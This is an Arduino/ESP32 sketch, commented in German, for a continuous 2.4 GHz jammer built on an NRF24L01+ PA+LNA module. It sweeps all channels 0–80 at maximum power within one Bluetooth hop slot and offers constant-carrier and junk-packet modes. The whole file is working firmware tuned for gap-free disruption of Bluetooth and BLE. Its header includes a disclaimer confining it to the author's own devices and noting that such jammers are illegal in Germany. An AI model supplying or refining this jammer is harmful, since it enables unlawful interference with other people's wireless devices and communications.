// ============================================================================
//  JammerContinuous.ino - aggressiver 2,4-GHz-Dauerstoerer (NRF24L01+ PA+LNA)
// ----------------------------------------------------------------------------
//  Ziel: moeglichst LUECKENLOSES Stoeren eines Bluetooth-Signals.
//
//  NUR fuer die kontrollierte Testumgebung mit EIGENEN Geraeten. Der Betrieb
//  eines wirksamen Stoersenders im oeffentlichen Raum ist in DE unzulaessig
//  (BNetzA). Dieser Sketch ist NICHT fuer den Dauer-/Oeffentlichkeitsbetrieb.
//
//  WARUM NEU GEGEN DEN ALTEN SKETCH:
//  Der alte two() hop springt in 2er-Schritten und trifft nur UNGERADE Kanaele,
//  und das relativ langsam -> gegen Bluetooth-AFH (haeppert ~1600x/s ueber das
//  Band) nur "immer mal wieder voll". Hier stattdessen:
//    - VOLLER Sweep ueber ALLE Kanaele 0..80 OHNE Pause. Ein Durchlauf dauert so
//      nur ~0,4 ms, also < ein BT-Hop-Slot (~625 us) -> jeder Hop wird getroffen.
//    - maximale Leistung (RF24_PA_MAX) und die bordeigenen Funkmodule AUS, damit
//      die Versorgung Reserve hat und kein 2,4-GHz-Eigenrauschen stoert.
//
//  WAHLWEISE zwei Stoermethoden (eine der beiden #defines aktiv lassen):
//    MODE_CARRIER = Dauertraeger (CONT_WAVE), schnell gewischt   -> Standard
//    MODE_PACKET  = laufend Muell-Pakete senden (moduliert)      -> Alternative,
//                   gegen manche BT-Geraete wirksamer. Beide testen!
// ============================================================================
#include "RF24.h"
#include "esp_bt.h"
#include "esp_wifi.h"

// ---- Verkabelung: HIER an deine Pins anpassen --------------------------------
// Konstruktor-Reihenfolge ist (CE, CSN, SPI-Takt).
#define CE_PIN    17
#define CSN_PIN    5
// SPI-Bus: VSPI -> SCK=18, MISO=19, MOSI=23 | HSPI -> SCK=14, MISO=12, MOSI=13
#define SPI_BUS   VSPI
#define SPI_HZ    16000000

// ---- Band: 0..80 deckt 2400..2480 MHz ab (BT/BLE komplett) -------------------
#define CH_MIN     0
#define CH_MAX    80

// ---- Stoermethode: genau EINE aktiv lassen -----------------------------------
//#define MODE_CARRIER
#define MODE_PACKET

SPIClass spi(SPI_BUS);
RF24 radio(CE_PIN, CSN_PIN, SPI_HZ);

void setup() {
  // Bordeigene Funkmodule vollstaendig AUS (wie im erprobten Standalone):
  // mehr Strom-Reserve fuer die PA und kein eigenes 2,4-GHz-Rauschen.
  esp_bt_controller_deinit();
  esp_wifi_stop();
  esp_wifi_deinit();

  Serial.begin(115200);
  spi.begin();

  if (!radio.begin(&spi)) {
    Serial.println("[jam] NRF24 nicht gefunden - Verkabelung/Versorgung pruefen!");
    return;
  }
  delay(200);  // dem Chip nach begin() kurz Zeit geben (wie im Standalone)

  radio.setAutoAck(false);
  radio.setRetries(0, 0);
  radio.setPayloadSize(32);
  radio.setAddressWidth(5);
  radio.setPALevel(RF24_PA_MAX, true);   // PA+LNA: volle Leistung
  radio.setDataRate(RF24_2MBPS);
  radio.setCRCLength(RF24_CRC_DISABLED);
  radio.stopListening();

#ifdef MODE_CARRIER
  radio.startConstCarrier(RF24_PA_MAX, CH_MIN);  // Dauertraeger EINMAL an
#endif
#ifdef MODE_PACKET
  const uint8_t addr[5] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  radio.openWritingPipe(addr);
#endif

  radio.printPrettyDetails();  // zur Kontrolle: PA_MAX, 2 MBPS, nRF24L01+
  Serial.println("[jam] laeuft - Vollband-Dauerstoerer aktiv.");
}

void loop() {
#ifdef MODE_CARRIER
  // Dauertraeger so SCHNELL wie moeglich ueber das ganze Band wischen. KEINE
  // Pause -> ein voller Durchlauf ~0,4 ms, deckt jeden BT-Hop ab.
  for (uint8_t ch = CH_MIN; ch <= CH_MAX; ch++) {
    radio.setChannel(ch);
  }
#endif

#ifdef MODE_PACKET
  // Laufend Muell-Pakete auf jedem Kanal senden (moduliertes Dauerfeuer).
  static uint8_t junk[32] = {0};  // Inhalt egal
  for (uint8_t ch = CH_MIN; ch <= CH_MAX; ch++) {
    radio.setChannel(ch);
    radio.writeFast(junk, 32);    // nicht blockierend; Erfolg egal
  }
  radio.txStandBy(2);             // FIFO leeren, dann weiter
#endif
}
